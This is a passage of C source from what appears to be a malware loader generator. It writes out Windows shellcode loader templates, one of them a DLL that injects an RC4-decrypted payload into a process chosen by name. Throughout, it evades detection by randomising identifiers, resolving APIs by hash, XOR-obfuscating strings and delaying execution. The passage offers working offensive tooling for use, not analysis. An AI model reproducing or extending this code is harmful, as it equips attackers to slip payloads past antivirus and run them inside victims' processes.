        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE %s(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)%s(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL RC4_Guard(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE            b = 0;\n"
        "    INT             i = 0;\n"
        "    PBYTE pRealKey = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwRc4KeySize);\n"
        "    HMODULE kee = %s(%s);\n"
        "    %s p%s = (%s)%s(kee, %s);\n"
        "    %s p%s = (%s)%s(kee, %s);\n"
        "    if (!pRealKey)\n"
        "        return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte)\n"
        "            break;\n"
        "        else\n"
        "            b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"
        "    char Adp[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    %s((char*)pFuio, sizeof(pFuio), xkey, sizeof(xkey));\n"
        "    %s p%s = (%s)p%s(p%s(Adp), pFuio);\n"
        "    p%s(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "BOOL %s() {\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    DWORD old_protection = 0;\n"
        "    HANDLE hthread = NULL;\n"
        "    SIZE_T Spayload = sizeof(%s);\n"
        "    HMODULE ern = %s(%s);\n"
        "    HMODULE ptll = %s(%s);\n"
        "    %s p%s = (%s)%s(ern, %s);\n"
        "    %s((char*)%s, sizeof(%s), xkey, sizeof(xkey));\n"
        "    PVOID address = %s(p%s(%s), %s);\n"
        "    %s p%s = (%s)%s(ptll, %s);\n"
        "    %s p%s = (%s)%s(ptll, %s);\n"
        "    %s p%s = (%s)%s(ptll, %s);\n"
        "    %s p%s = (%s)%s(ptll, %s);\n"
        "    p%s((HANDLE)-1, &address, &Spayload, PAGE_READWRITE, &old_protection);\n"
        "    memcpy(address, %s, Spayload);\n"
        "    RC4_Guard(HINT_BYTE, %s, address, sizeof(%s), Spayload);\n"
        "    p%s((HANDLE)-1, &address, &Spayload, PAGE_EXECUTE_READ, &old_protection);\n"
        "    p%s(&hthread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, address, NULL, FALSE, 0, 0, 0, NULL);\n"
        "    p%s(hthread, FALSE, &timeout);\n"
        "    p%s(hthread);\n"
        "    return TRUE;\n"
        "}\n"
        "VOID %s(IN FLOAT fMinutes) {\n"
        "    HMODULE ntb = %s(%s);\n"
        "    %s p%s = (%s)%s(ntb, %s);\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    p%s(FALSE, &DelayInterval);\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n"
        "    %s();\n"
        "    return 0;\n"
        "}\n",
        SystemFunction032_typedef,
        LoadLibraryA_typedef,
        GetProcAddress_typedef,
        NtProtectVirtualMemory_typedef,
        NtCreateThreadEx_typedef,
        NtWaitForSingleObject_typedef,
        NtClose_typedef,
        NtDelayExecution_typedef,
        random_toUpper_name,
        random_seed_name,
        random_helper_name,
        random_seed_name,
        random_iatcamouflage_name,
        random_helper_name,
        ntdll_hash_name,
        kernel32_hash_name,
        ntprotectvirtualmemory_hash_name,
        ntwaitforsingleobject_hash_name,
        ntcreatethreadex_hash_name,
        ntdelayexecution_hash_name,
        ntclose_hash_name,
        loadlibrarya_hash_name,
        getprocaddress_hash_name,
        messageboxa_hash_name,
        random_obf_func,
        xkey, obfuscated_fun, random_user32_name, obfuscated_user32,
        random_payload_name, shellcodeArray,
        random_key_name, keyArray, hint,
        random_getproc_name,
        random_getmodule_name,
        random_toUpper_name,
        random_getmodule_name, kernel32_hash_name,
        LoadLibraryA_typedef, pLoadLibraryA_name, LoadLibraryA_typedef, random_getproc_name, loadlibrarya_hash_name,
        GetProcAddress_typedef, pGetProcAddress_name, GetProcAddress_typedef, random_getproc_name, getprocaddress_hash_name,
        random_obf_func,
        SystemFunction032_typedef, pSystemFunction032_name, SystemFunction032_typedef, pGetProcAddress_name, pLoadLibraryA_name,
        pSystemFunction032_name,
        random_inject_func,
        random_payload_name,
        random_getmodule_name, kernel32_hash_name,
        random_getmodule_name, ntdll_hash_name,
        LoadLibraryA_typedef, pLoadLibraryA_name, LoadLibraryA_typedef, random_getproc_name, loadlibrarya_hash_name,
        random_obf_func, random_user32_name, random_user32_name,
        random_getproc_name, pLoadLibraryA_name, random_user32_name, messageboxa_hash_name,
        NtProtectVirtualMemory_typedef, pNtProtectVirtualMemory_name, NtProtectVirtualMemory_typedef, random_getproc_name, ntprotectvirtualmemory_hash_name,
        NtCreateThreadEx_typedef, pNtCreateThreadEx_name, NtCreateThreadEx_typedef, random_getproc_name, ntcreatethreadex_hash_name,
        NtWaitForSingleObject_typedef, pNtWaitForSingleObject_name, NtWaitForSingleObject_typedef, random_getproc_name, ntwaitforsingleobject_hash_name,
        NtClose_typedef, pNtClose_name, NtClose_typedef, random_getproc_name, ntclose_hash_name,
        pNtProtectVirtualMemory_name,
        random_payload_name, random_key_name, random_key_name,
        pNtProtectVirtualMemory_name,
        pNtCreateThreadEx_name,
        pNtWaitForSingleObject_name,
        pNtClose_name,
        random_delay_func,
        random_getmodule_name, ntdll_hash_name,
        NtDelayExecution_typedef, pNtDelayExecution_name, NtDelayExecution_typedef, random_getproc_name, ntdelayexecution_hash_name,
        pNtDelayExecution_name,
        random_inject_func
    );
}
void obf_7_inject_explorar_DLL(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint, const char* Rprocess) {
    // Seed random number generator
    srand((unsigned int)time(NULL));

    // Random name generation for variables and functions
    char random_toUpper_name[10], random_seed_name[10], random_helper_name[10];
    char random_obf_func[10], random_delay_func[10], random_inject_func[10];
    char random_iatcamouflage_name[10];

    generate_random_string(random_toUpper_name, sizeof(random_toUpper_name));
    generate_random_string(random_seed_name, sizeof(random_seed_name));
    generate_random_string(random_helper_name, sizeof(random_helper_name));
    generate_random_string(random_obf_func, sizeof(random_obf_func));
    generate_random_string(random_delay_func, sizeof(random_delay_func));
    generate_random_string(random_inject_func, sizeof(random_inject_func));
    generate_random_string(random_iatcamouflage_name, sizeof(random_iatcamouflage_name));

    // Random names for GetModuleHandleH, GetProcAddressH
    char random_getmodule_name[15], random_getproc_name[15];

    generate_random_string(random_getmodule_name, sizeof(random_getmodule_name));
    generate_random_string(random_getproc_name, sizeof(random_getproc_name));

    // Random pointer names
    char pSystemFunction032_name[9], pLoadLibraryA_name[9], pGetProcAddress_name[9];
    char pNtAllocateVirtualMemory_name[9], pWriteProcessMemory_name[9];
    char pNtCreateThreadEx_name[9], pNtWaitForSingleObject_name[9], pNtClose_name[9];
    char pCreateToolhelp32Snapshot_name[9], pProcess32First_name[9], pProcess32Next_name[9];
    char pOpenProcess_name[9], plstrcmpiA_name[9], pNtDelayExecution_name[9];

    generate_random_string(pSystemFunction032_name, sizeof(pSystemFunction032_name));
    generate_random_string(pLoadLibraryA_name, sizeof(pLoadLibraryA_name));
    generate_random_string(pGetProcAddress_name, sizeof(pGetProcAddress_name));
    generate_random_string(pNtAllocateVirtualMemory_name, sizeof(pNtAllocateVirtualMemory_name));
    generate_random_string(pWriteProcessMemory_name, sizeof(pWriteProcessMemory_name));
    generate_random_string(pNtCreateThreadEx_name, sizeof(pNtCreateThreadEx_name));
    generate_random_string(pNtWaitForSingleObject_name, sizeof(pNtWaitForSingleObject_name));
    generate_random_string(pNtClose_name, sizeof(pNtClose_name));
    generate_random_string(pCreateToolhelp32Snapshot_name, sizeof(pCreateToolhelp32Snapshot_name));
    generate_random_string(pProcess32First_name, sizeof(pProcess32First_name));
    generate_random_string(pProcess32Next_name, sizeof(pProcess32Next_name));
    generate_random_string(pOpenProcess_name, sizeof(pOpenProcess_name));
    generate_random_string(plstrcmpiA_name, sizeof(plstrcmpiA_name));
    generate_random_string(pNtDelayExecution_name, sizeof(pNtDelayExecution_name));

    // Random names for hashing definitions
    char ntdll_hash_name[11], kernel32_hash_name[11], ntallocatevirtualmemory_hash_name[11];
    char writeprocessmemory_hash_name[12], ntwaitforsingleobject_hash_name[12];
    char ntcreatethreadex_hash_name[11], ntdelayexecution_hash_name[11], ntclose_hash_name[11];
    char loadlibrarya_hash_name[11], getprocaddress_hash_name[11], createtoolhelp32snapshot_hash_name[11];
    char process32first_hash_name[11], process32next_hash_name[11], openprocess_hash_name[11];
    char lstrcmpiA_hash_name[11];

    generate_random_string(ntdll_hash_name, sizeof(ntdll_hash_name));
    generate_random_string(kernel32_hash_name, sizeof(kernel32_hash_name));
    generate_random_string(ntallocatevirtualmemory_hash_name, sizeof(ntallocatevirtualmemory_hash_name));
    generate_random_string(writeprocessmemory_hash_name, sizeof(writeprocessmemory_hash_name));
    generate_random_string(ntwaitforsingleobject_hash_name, sizeof(ntwaitforsingleobject_hash_name));
    generate_random_string(ntcreatethreadex_hash_name, sizeof(ntcreatethreadex_hash_name));
    generate_random_string(ntdelayexecution_hash_name, sizeof(ntdelayexecution_hash_name));
    generate_random_string(ntclose_hash_name, sizeof(ntclose_hash_name));
    generate_random_string(loadlibrarya_hash_name, sizeof(loadlibrarya_hash_name));
    generate_random_string(getprocaddress_hash_name, sizeof(getprocaddress_hash_name));
    generate_random_string(createtoolhelp32snapshot_hash_name, sizeof(createtoolhelp32snapshot_hash_name));
    generate_random_string(process32first_hash_name, sizeof(process32first_hash_name));
    generate_random_string(process32next_hash_name, sizeof(process32next_hash_name));
    generate_random_string(openprocess_hash_name, sizeof(openprocess_hash_name));
    generate_random_string(lstrcmpiA_hash_name, sizeof(lstrcmpiA_hash_name));

    // Random typedef names
    char SystemFunction032_typedef[12], LoadLibraryA_typedef[12], GetProcAddress_typedef[12];
    char NtAllocateVirtualMemory_typedef[12], WriteProcessMemory_typedef[12];
    char NtCreateThreadEx_typedef[12], NtWaitForSingleObject_typedef[12], NtClose_typedef[12];
    char CreateToolhelp32Snapshot_typedef[12], Process32First_typedef[12], Process32Next_typedef[12];
    char OpenProcess_typedef[12], lstrcmpiA_typedef[12], NtDelayExecution_typedef[12];

    generate_random_string(SystemFunction032_typedef, sizeof(SystemFunction032_typedef));
    generate_random_string(LoadLibraryA_typedef, sizeof(LoadLibraryA_typedef));
    generate_random_string(GetProcAddress_typedef, sizeof(GetProcAddress_typedef));
    generate_random_string(NtAllocateVirtualMemory_typedef, sizeof(NtAllocateVirtualMemory_typedef));
    generate_random_string(WriteProcessMemory_typedef, sizeof(WriteProcessMemory_typedef));
    generate_random_string(NtCreateThreadEx_typedef, sizeof(NtCreateThreadEx_typedef));
    generate_random_string(NtWaitForSingleObject_typedef, sizeof(NtWaitForSingleObject_typedef));
    generate_random_string(NtClose_typedef, sizeof(NtClose_typedef));
    generate_random_string(CreateToolhelp32Snapshot_typedef, sizeof(CreateToolhelp32Snapshot_typedef));
    generate_random_string(Process32First_typedef, sizeof(Process32First_typedef));
    generate_random_string(Process32Next_typedef, sizeof(Process32Next_typedef));
    generate_random_string(OpenProcess_typedef, sizeof(OpenProcess_typedef));
    generate_random_string(lstrcmpiA_typedef, sizeof(lstrcmpiA_typedef));
    generate_random_string(NtDelayExecution_typedef, sizeof(NtDelayExecution_typedef));

    // Random names for EncryptedPayload and ProtectedKey
    char random_payload_name[15], random_key_name[15];

    generate_random_string(random_payload_name, sizeof(random_payload_name));
    generate_random_string(random_key_name, sizeof(random_key_name));

    // Random names for additional functions
    char random_rc4guard_func[10], random_findtarget_func[10];
    char random_initialize_func[10], random_start_func[10], random_run_func[10];
    char random_hacked_func[10], random_dllmain_func[10];
    char random_hashstring_func[10], random_memcpy_func[10], random_mymalloc_func[10];

    generate_random_string(random_rc4guard_func, sizeof(random_rc4guard_func));
    generate_random_string(random_findtarget_func, sizeof(random_findtarget_func));
    generate_random_string(random_initialize_func, sizeof(random_initialize_func));
    generate_random_string(random_start_func, sizeof(random_start_func));
    generate_random_string(random_run_func, sizeof(random_run_func));
    generate_random_string(random_hacked_func, sizeof(random_hacked_func));
    generate_random_string(random_dllmain_func, sizeof(random_dllmain_func));
    generate_random_string(random_hashstring_func, sizeof(random_hashstring_func));
    generate_random_string(random_memcpy_func, sizeof(random_memcpy_func));
    generate_random_string(random_mymalloc_func, sizeof(random_mymalloc_func));

    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));

    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);
    char* Remotprocess = obf(Rprocess, xkey);

    snprintf(payload, size,
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* %s)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* %s)(LPCSTR);\n"
        "typedef enum _SECTION_INHERIT {\n"
        "    ViewShare = 1,\n"
        "    ViewUnmap = 2\n"
        "} SECTION_INHERIT, * PSECTION_INHERIT;\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef struct tagPROCESSENTRY32W\n"
        "{\n"
        "    DWORD   dwSize;\n"
        "    DWORD   cntUsage;\n"
        "    DWORD   th32ProcessID;\n"
        "    ULONG_PTR th32DefaultHeapID;\n"
        "    DWORD   th32ModuleID;\n"
        "    DWORD   cntThreads;\n"
        "    DWORD   th32ParentProcessID;\n"
        "    LONG    pcPriClassBase;\n"
        "    DWORD   dwFlags;\n"
        "    WCHAR   szExeFile[MAX_PATH];\n"
        "} PROCESSENTRY32W;\n"
        "typedef PROCESSENTRY32W* PPROCESSENTRY32W;\n"
        "typedef PROCESSENTRY32W* LPPROCESSENTRY32W;\n"
        "#define PROCESSENTRY32 PROCESSENTRY32W\n"
        "#define LPPROCESSENTRY32 LPPROCESSENTRY32W\n"
        "#define TH32CS_SNAPPROCESS  0x00000002\n"
        "typedef HANDLE(NTAPI* %s)(DWORD dwFlags, DWORD th32ProcessID);\n"
        "typedef BOOL(NTAPI* %s)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);\n"
        "typedef BOOL(NTAPI* %s)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);\n"
        "typedef HANDLE(NTAPI* %s)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);\n"
        "typedef int(NTAPI* %s)(LPCSTR lpString1, LPCSTR lpString2);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);\n"
        "typedef NTSTATUS(NTAPI* funNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);\n"
        "typedef NTSTATUS(NTAPI* funNtWriteVirtualMemory)(HANDLE ,PVOID ,PVOID ,ULONG,PULONG);\n"
        "typedef BOOL(NTAPI* %s)(HANDLE, LPVOID, LPCVOID , SIZE_T , SIZE_T* );\n"
        "typedef NTSTATUS(NTAPI* %s)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE);\n"
        "typedef FARPROC(NTAPI* %s)(HMODULE, LPCSTR);\n"
        "typedef NTSTATUS(NTAPI* %s)(BOOLEAN, PLARGE_INTEGER);\n\n"
        "#define %s                      0x5251037A\n"
        "#define %s                   0xA5E086A2\n"
        "#define %s    0x0B37D3B9\n"
        "#define %s     0x54256ED5\n"
        "#define %s      0xCB42C5A9\n"
        "#define %s           0x61D8C71D\n"
        "#define %s           0x1236E2D7\n"
        "#define %s                    0xF20D7F2A\n"
        "#define %s               0xA4E3F108\n"
        "#define %s             0xB9D893EC\n"
        "#define %s   0x5D3C1742\n"
        "#define %s             0xA00889BE\n"
        "#define %s              0x35DB6F55\n"
        "#define %s                0x2007BE63\n"
        "#define %s                  0xC9B81F21\n\n"
        "void %s(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char pxf[] = {%s};\n"
        "char rp[] = {%s};\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "CHAR %s(CHAR C) {\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n"
        "char memory_pool[1024];\n"
        "unsigned int pool_index = 0;\n"
        "void* %s(unsigned int size) {\n"
        "    if (pool_index + size > sizeof(memory_pool)) {\n"
        "        return 0;\n"
        "    }\n"
        "    void* ptr = &memory_pool[pool_index];\n"
        "    pool_index += size;\n"
        "    return ptr;\n"
        "}\n"
        "#define INITIAL_HASH 4338\n"
        "#define INITIAL_SEED 7\n"
        "DWORD %s(_In_ LPCSTR String) {\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (%s((PCHAR) API))\n"
        "FARPROC %s(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0) return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) return NULL;\n"
        "    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE %s(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0) return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)%s(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL %s(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE b = 0;\n"
        "    INT i = 0;\n"
        "    PBYTE pRealKey = (PBYTE)%s(dwRc4KeySize);\n"
        "    HMODULE kernel = %s(%s);\n"
        "    %s p%s = (%s)%s(kernel, %s);\n"
        "    %s p%s = (%s)%s(kernel, %s);\n"
        "    if (!pRealKey) return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte) break;\n"
        "        else b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"
        "    char pAd[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    %s((char*)pxf, sizeof(pxf), xkey, sizeof(xkey));\n"
        "    %s p%s = (%s)p%s(p%s(pAd), pxf);\n"
        "    p%s(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "unsigned char %s[] = { %s };\n"
        "unsigned char %s[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "SIZE_T payload_len = sizeof(%s);\n"
        "int %s(const char* procname) {\n"
        "    PROCESSENTRY32 pe32;\n"
        "    int pid = 0;\n"
        "    HANDLE hProcSnap = p%s(TH32CS_SNAPPROCESS, 0);\n"
        "    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;\n"
        "    pe32.dwSize = sizeof(PROCESSENTRY32);\n"
        "    if (!p%s(hProcSnap, &pe32)) {\n"
        "        p%s(hProcSnap);\n"
        "        return 0;\n"
        "    }\n"
        "    while (p%s(hProcSnap, &pe32)) {\n"
        "        if (p%s(procname, (LPCSTR)pe32.szExeFile) == 0) {\n"
        "            pid = pe32.th32ProcessID;\n"
        "            break;\n"
        "        }\n"
        "    }\n"
        "    p%s(hProcSnap);\n"
        "    return pid;\n"
        "}\n"
        "int %s(HANDLE hProc, unsigned char* payload, SIZE_T payload_len) {\n"
        "    PVOID address = NULL;\n"
        "    HANDLE hThread = NULL;\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    p%s(hProc, &address, 0, &payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);\n"
        "    p%s(hProc, address, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);\n"
        "    p%s(&hThread, THREAD_ALL_ACCESS, NULL, hProc, address, NULL, 0, 0, 0, 0, 0);\n"
        "    p%s(hThread, FALSE, &timeout);\n"
        "    p%s(hThread);\n"
        "}\n"
        "BOOL %s() {\n"
        "    HMODULE ntdll = %s(%s);\n"
        "    HMODULE kernel = %s(%s);\n"
        "    p%s = (%s)%s(kernel, %s);\n"
        "    p%s = (%s)%s(kernel, %s);\n"
        "    p%s = (%s)%s(kernel, %s);\n"
        "    p%s = (%s)%s(kernel, %s);\n"
        "    p%s = (%s)%s(kernel, %s);\n"
        "    p%s = (%s)%s(ntdll, %s);\n"
        "    p%s = (%s)%s(kernel, %s);\n"
        "    p%s = (%s)%s(ntdll, %s);\n"
        "    p%s = (%s)%s(ntdll, %s);\n"
        "    p%s = (%s)%s(ntdll, %s);\n"
        "}\n"
        "VOID %s(IN FLOAT fMinutes) {\n"
        "    HMODULE ntdll = %s(%s);\n"
        "    %s p%s = (%s)%s(ntdll, %s);\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    p%s(FALSE, &DelayInterval);\n"
        "}\n"
        "VOID %s() {\n"
        "    %s();\n"
        "    int pid = 0;\n"
        "    %s((char*)rp, sizeof(rp), xkey, sizeof(xkey));\n"
        "    pid = %s(rp);\n"
        "    if (pid) {\n"
        "        HANDLE hProc = p%s(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)pid);\n"
        "        if (hProc != NULL) {\n"
        "            %s(HINT_BYTE, %s, %s, sizeof(%s), sizeof(%s));\n"
        "            %s(hProc, %s, payload_len);\n"
        "            p%s(hProc);\n"
        "        }\n"
        "    }\n"
        "}\n"
        "VOID %s() {\n"
        "    %s();\n"
        "}\n"
        "extern __declspec(dllexport) int hacked() {\n"
        "    %s();\n"
        "}\n"
        "BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {\n"
        "    switch (ul_reason_for_call) {\n"
        "    case DLL_PROCESS_ATTACH:\n"
        "    case DLL_PROCESS_DETACH:\n"
        "    case DLL_THREAD_ATTACH:\n"
        "    case DLL_THREAD_DETACH:\n"
        "        break;\n"
        "    }\n"
        "    return TRUE;\n"
        "}\n",
        SystemFunction032_typedef,
        LoadLibraryA_typedef,
        CreateToolhelp32Snapshot_typedef,
        Process32First_typedef,
        Process32Next_typedef,
        OpenProcess_typedef,
        lstrcmpiA_typedef,
        NtAllocateVirtualMemory_typedef,
        WriteProcessMemory_typedef,
        NtCreateThreadEx_typedef,
        NtWaitForSingleObject_typedef,
        NtClose_typedef,
        GetProcAddress_typedef,
